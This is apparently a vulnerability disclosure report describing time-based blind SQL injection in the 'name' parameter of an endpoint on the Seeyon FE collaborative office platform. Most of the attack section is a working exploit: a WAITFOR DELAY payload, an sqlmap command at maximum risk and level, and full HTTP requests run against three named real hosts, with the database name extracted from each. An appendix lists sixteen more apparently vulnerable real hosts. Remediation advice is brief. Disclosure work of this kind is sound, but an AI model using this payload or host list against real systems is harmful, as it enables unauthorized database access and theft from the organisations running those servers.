# Vulnerability Title
SQL Injection Vulnerability in Seeyon FE Collaborative Office Platform `/sysform/042/check.js%70` Endpoint

---

# Vulnerability Description
A SQL injection vulnerability exists in the FE Collaborative Office Platform developed by Beijing Seeyon Internet Software Corp. An attacker can exploit this vulnerability by crafting malicious requests to access sensitive information from the database. The affected system is the Seeyon FE platform (note: this is not a product of FeiQi Internet).

---

# Affected Scope
+ **Affected Product**: Seeyon FE Collaborative Office Platform (not a product of FeiQi Internet).
+ **Fingerprinting**: Potentially affected assets can be identified using cyberspace mapping tools like Fofa with the search term `app="致远互联-FE"`.  
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1742878891877-09f365a1-4cf8-41ba-b25f-a3aaf1a17826.png)
+ **Product Verification**: Refer to the following article for more details:  
[https://mp.weixin.qq.com/s/mLD1S9D9vZJIbjbHvx2-yg](https://mp.weixin.qq.com/s/mLD1S9D9vZJIbjbHvx2-yg)  
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1742878896649-6be07ddd-b102-4893-b233-a7538daa2fc4.png)  
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1742878900342-73e4b223-fc61-496b-b7a7-d1aaac10318e.png)

---

# Vulnerability Verification & Reproduction
### Vulnerable Endpoint
```http
POST /sysform/042/check.js%70 HTTP/1.1
```

The injection point is in the **name** parameter. Example:

```http
opt=1&id=&name=11';WAITFOR+DELAY+'0:0:2'--+-
```

### Tools for Testing
Automated tools like `sqlmap` can be used for detection.  
Example:

```bash
sqlmap -u "http://TARGET_IP:9090/sysform/042/check.js%70" --data="opt=1&id=&name=11';WAITFOR+DELAY+'0:0:2'--+-" --risk=3 --level=5
```

---

### Case 1
+ **Target IP**: `http://125.91.119.208:9090`
+ **POC Reproduction**:
    - Request:

```http
POST /sysform/042/check.js%70 HTTP/1.1
Host: 125.91.119.208:9090
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

opt=1&id=&name=11';WAITFOR+DELAY+'0:0:2'--+-
```

+ **Result**: The response is delayed by about 2 seconds, confirming the vulnerability.
+ **Screenshot**:  
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1742878933970-c514e2c1-2955-42ae-a080-89cc608dcdb9.png)
+ **SQLmap Output**: Current database identified as `FE_BASE5`.  
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1742878930257-208de493-e8d0-4463-9604-321ea1f58a22.png)
+ **Asset Proof**:  
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1742879849504-cbbe56a3-9f07-42d6-a54f-ab0289733bca.png)

---

### Case 2
+ **Target IP**: `http://218.22.206.38:9090`
+ **POC Reproduction**:
    - Request:

```http
POST /sysform/042/check.js%70 HTTP/1.1
Host: 218.22.206.38:9090
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

opt=1&id=&name=11';WAITFOR+DELAY+'0:0:2'--+-
```

+ **Result**: 2-second delay observed, confirming the vulnerability.
+ **Screenshot**:  
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1742878944129-c901f6a7-294d-4428-b709-686a01cc746b.png)
+ **SQLmap Output**: Database name extracted as `FE_BASE5`.  
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1742878953723-5c2576fc-e6d4-465b-8246-c82132d0f6e1.png)
+ **Asset Proof**:  
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1742879921756-7287c21f-6bcc-4a16-bd34-1781c8a1a3ad.png)

---

### Case 3
+ **Target IP**: `http://oa.avit.com.cn:9090`
+ **POC Reproduction**:
    - Request:

```http
POST /sysform/042/check.js%70 HTTP/1.1
Host: oa.avit.com.cn:9090
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

opt=1&id=&name=11';WAITFOR+DELAY+'0:0:2'--+-
```

+ **Result**: 2-second delay confirms the vulnerability.
+ **Screenshot**:  
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1742878952743-5776b75d-b107-40c7-9009-03c33edd6e64.png)
+ **SQLmap Output**: Extracted database name is `FE_BASE5`.  
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1742878956021-1e55f1a7-cb3e-4952-a63b-368cffb3c2d2.png)
+ **Asset Proof**:  
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1742879893368-903abe8b-3c8e-425f-9612-237e4ab27529.png)

---

# Proof of Vulnerability
## Vendor Information
+ **Vendor Name (CN)**: 北京致远互联软件股份有限公司
+ **Vendor Name (EN)**: BeiJing Seeyon Internet Software Corp.
+ **Official Website**: [www.seeyon.com](http://www.seeyon.com/)
+ **Email**: [zhangxiu@seeyon.com](mailto:zhangxiu@seeyon.com)
+ **Registered Capital**: ¥115,158,439
+ ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1740239506867-badbe13f-c4b2-4f83-b691-67d27de49de9.png)

## Technical Details
The vulnerability lies in the **name** parameter of the endpoint, which lacks proper input filtering. Attackers can inject malicious SQL payloads (e.g., `11';WAITFOR+DELAY+'0:0:2'--+-`) to perform blind time-based SQL injection and extract sensitive database information.

---

# Remediation Suggestions
1. **Input Validation**: Strictly validate and sanitize inputs like the **name** parameter.
2. **Prepared Statements**: Use parameterized queries instead of dynamically building SQL queries.
3. **Least Privilege Principle**: Restrict database user privileges; avoid using high-privilege accounts.
4. **Patch & Update**: Contact Seeyon for official security patches or mitigation recommendations.

---

# Disclaimer
This report is intended solely for research and remediation purposes. Any illegal use of this information is strictly prohibited. Unauthorized exploitation may result in legal consequences.

---

# Appendix
Other potentially affected IPs:

+ [http://121.33.38.234:9090](http://121.33.38.234:9090/)
+ [http://218.22.206.38:9090](http://218.22.206.38:9090/)
+ [http://52.130.254.228:9090](http://52.130.254.228:9090/)
+ [http://218.17.117.55:9090](http://218.17.117.55:9090/)
+ [http://183.247.156.247:9090](http://183.247.156.247:9090/)
+ [http://121.31.124.114:9090](http://121.31.124.114:9090/)
+ [http://58.247.134.2:9090](http://58.247.134.2:9090/)
+ [http://219.146.165.142:9090](http://219.146.165.142:9090/)
+ [http://183.63.225.100:9090](http://183.63.225.100:9090/)
+ [http://120.82.178.130:9090](http://120.82.178.130:9090/)
+ [http://oa1.longlive.cn:9090](http://oa1.longlive.cn:9090/)
+ [http://125.91.119.208:9090](http://125.91.119.208:9090/)
+ [http://oa.avit.com.cn:9090](http://oa.avit.com.cn:9090/)
+ [http://14.145.142.223:9090](http://14.145.142.223:9090/)
+ [http://183.59.159.122:9090](http://183.59.159.122:9090/)
+ [https://221.7.151.135](https://221.7.151.135/)

---

